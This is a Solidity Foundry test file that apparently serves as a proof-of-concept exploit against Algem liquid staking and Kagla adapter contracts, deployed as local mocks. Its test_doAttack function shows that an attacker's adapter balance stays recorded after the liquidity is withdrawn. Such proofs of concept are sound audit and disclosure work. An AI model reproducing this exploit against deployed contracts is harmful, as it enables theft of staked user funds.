// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {Test, console2} from "forge-std/Test.sol";

import "./DeployStorage.sol";

contract ExploitSimulation is DeployStorage, Test {
    address user;
    address attacker;
    address deployer;

    function setUp() public {
        user = vm.addr(1);
        deployer = vm.addr(2);
        attacker = vm.addr(3);

        vm.deal(user, ~uint256(0));
        vm.deal(attacker, ~uint256(0));
        vm.deal(deployer, ~uint256(0));

        _deployLiquidStakingContracts();
        _deployKaglaPool();        

        console2.log("Deployer address:", deployer);
        console2.log("Attacker address:", attacker);
    }

    function test_doAttack() public {
        vm.startPrank(attacker);

        // do stake and receive nastr
        uint256 astrToStake = 100000e18;
        _stake(astrToStake);

        // add liquidity to KaglaAdapter
        uint256[] memory amounts = new uint256[](2);
        (amounts[0], amounts[1]) = (100000e18, 100000e18);

        nastr.approve(address(kaglaAdapter), ~uint256(0));
        kaglaAdapter.addLiquidity{value: amounts[0]}(amounts, false);

        vm.stopPrank();

        // send ALSDiscount NFT to attacker address
        address[] memory accounts = new address[](1);
        accounts[0] = deployer;

        vm.prank(deployer);
        nft.mintBatch(accounts, AlgemLiquidStakingDiscount.TokenType.ASTARDEGENS);

        vm.prank(deployer);
        nft.transferFrom(deployer, attacker, 0);
        assertEq(nft.balanceOf(attacker), 1);

        (, string[] memory arr) = nftdistr.getUserNfts(attacker);

        // remove liquidity from KaglaAdapter
        vm.startPrank(attacker);
        kaglaAdapter.removeLiquidity(kaglaAdapter.lpBalances(attacker));

        (, string[] memory arr2) = nftdistr.getUserNfts(attacker);

        // As we can see here, the hacker's balance in the adapter has not changed, despite the fact that liquidity has been withdrawn 
        assertEq(adistr.getUserBalanceInAdapters(attacker), 100000e18);

        vm.stopPrank();
    }

    function test_transferTokens() public payable prank(user) {
        uint256 astrToStake = 100e18;
        _stake(astrToStake);

        nastr.transfer(attacker, 1000);
        assertEq(nastr.balanceOf(attacker), 1000);
    }

    function test_transferNft() public {
        address[] memory accounts = new address[](1);
        accounts[0] = deployer;
        vm.prank(deployer);
        nft.mintBatch(accounts, AlgemLiquidStakingDiscount.TokenType.ASTARDEGENS);
        assertEq(nft.balanceOf(deployer), 1);

        vm.prank(deployer);
        nft.transferFrom(deployer, attacker, 0);
        assertEq(nft.balanceOf(attacker), 1);
    }

    function test_addAndRemoveLiquidityToKagla() public prank(user) {
        _stake(10e18);

        uint256[] memory amounts = new uint256[](2);
        (amounts[0], amounts[1]) = (10e18, 10e18);

        nastr.approve(address(kaglaAdapter), ~uint256(0));
        kaglaAdapter.addLiquidity{value: amounts[0]}(amounts, false);

        assertEq(adistr.getUserBalanceInAdapters(user), 10e18);

        kaglaAdapter.removeLiquidity(kaglaLp.balanceOf(msg.sender));

        assertEq(adistr.getUserBalanceInAdapters(user), 0);
    }

    function _stake(uint256 amount) private {
        string[] memory utils = new string[](1);
        uint256[] memory amounts = new uint256[](1);

        (utils[0], amounts[0]) = ("LiquidStaking", amount);

        liquid.stake{value: amount}(utils, amounts);
    }

    function _deployLiquidStakingContracts() private prank(deployer) {
        admin = new ProxyAdmin();

        ds = new MockDappsStaking();

        lsImpl = new LiquidStaking();
        managerImpl = new LiquidStakingManager();
        distrImpl = new NDistributor();
        nastrImpl = new NASTR();
        nftdistrImpl = new NFTDistributor();
        adistrImpl = new AdaptersDistributor();
        nftImpl = new AlgemLiquidStakingDiscount();

        lsProxy = new TransparentUpgradeableProxy(address(lsImpl), address(admin), "");
        managerProxy = new TransparentUpgradeableProxy(address(managerImpl), address(admin), "");
        distrProxy = new TransparentUpgradeableProxy(address(distrImpl), address(admin), "");
        nastrProxy = new TransparentUpgradeableProxy(address(nastrImpl), address(admin), "");
        nftdistrProxy = new TransparentUpgradeableProxy(address(nftdistrImpl), address(admin), "");
        adistrProxy = new TransparentUpgradeableProxy(address(adistrImpl), address(admin), "");
        nftProxy = new TransparentUpgradeableProxy(address(nftImpl), address(admin), "");

        manager = LiquidStakingManager(address(managerProxy));
        manager.initialize();

        distr = NDistributor(address(distrProxy));
        distr.initialize();
        distr.addUtility("LiquidStaking");        

        nastr = NASTR(address(nastrProxy));
        nastr.initialize(address(distr));

        distr.changeDntAddress("nASTR", address(nastr));
        distr.grantRole(keccak256("MANAGER_CONTRACT"), address(nastr));
        distr.grantRole(keccak256("MANAGER"), address(nastr));
        distr.setLiquidStaking(address(lsProxy));

        ls = LiquidStaking(payable(address(lsProxy)));
        ls.initialize(
            "nASTR",
            "LiquidStaking",
            address(distr),
            address(ds),
            address(adistrProxy)
        );

        liquid = LiquidStakingMain(address(ls));

        nftdistr = NFTDistributor(address(nftdistrProxy));
        nftdistr.initialize(
            address(distr),
            address(nastr),
            address(ls),
            address(adistrProxy)
        );

        nastr.setNftDistributor(address(nftdistr));

        adistr = AdaptersDistributor(address(adistrProxy));
        adistr.initialize(address(ls));
        adistr.setNftDistributor(address(nftdistr));

        ls.setLiquidStakingManager(address(manager));
        ls.grantRole(keccak256("MANAGER"), address(nftdistr));

        lsMain = new LiquidStakingMain();

        manager.addSelectorsBatch(
            selectorsMain,
            address(lsMain)
        );

        nft = AlgemLiquidStakingDiscount(address(nftProxy));
        nft.initialize(
            "ALSD NFT",
            "ALSD",
            "baseUri",
            nftdistr
        );
        nft.changeMaxSupply(100);
        nftdistr.addUtility(address(nft), 8, false);
        nftdistr.grantRole(keccak256("TOKEN_CONTRACT"), address(nft));
    }

    function _deployKaglaPool() private prank(deployer) {        
        kaglaFarm = new MockKaglaFarm();
        kaglaLp = new MockERC20("Kagla LP Token", "Kagla-lp");
        kaglaGauge = new MockERC20("Kagla Gauge Token", "Kagla-Gauge");
        kaglaRewardToken = new MockERC20("Kagle Reward Token", "Kagle-Reward");

        kaglaPool = new MockKaglaPool(
            nastr,
            kaglaLp
        );

        admin = new ProxyAdmin();
        kaglaAdapterImpl = new KaglaAdapter();
        kaglaAdapterProxy = new TransparentUpgradeableProxy(address(kaglaAdapterImpl), address(admin), "");
        kaglaAdapter = KaglaAdapter(payable(address(kaglaAdapterProxy)));
        kaglaAdapter.initialize(
            IKaglaPool(address(kaglaPool)),
            IKaglaFarm(address(kaglaFarm)),
            IERC20Upgradeable(address(kaglaLp)),
            IERC20Upgradeable(address(nastr)),
            IERC20Upgradeable(address(kaglaGauge)),
            IERC20Upgradeable(address(kaglaRewardToken)),
            IMinter(address(kaglaMinter))
        );
        kaglaAdapter.setAdaptersDistributor(IAdaptersDistributor(address(adistr)));
        kaglaAdapter.setUtilityName("Kagla_Adapter");
        adistr.addAdapter(address(kaglaAdapter), "Kagla_Adapter");

        // add liquidity to Kagla pool
        _stake(100e18);

        uint256[] memory amounts = new uint256[](2);
        (amounts[0], amounts[1]) = (100e18, 100e18);

        nastr.approve(address(kaglaAdapter), ~uint256(0));
        kaglaAdapter.addLiquidity{value: amounts[0]}(amounts, false);
    }

    modifier prank(address addr) {
        vm.startPrank(addr);
        _;
        vm.stopPrank();
    }
}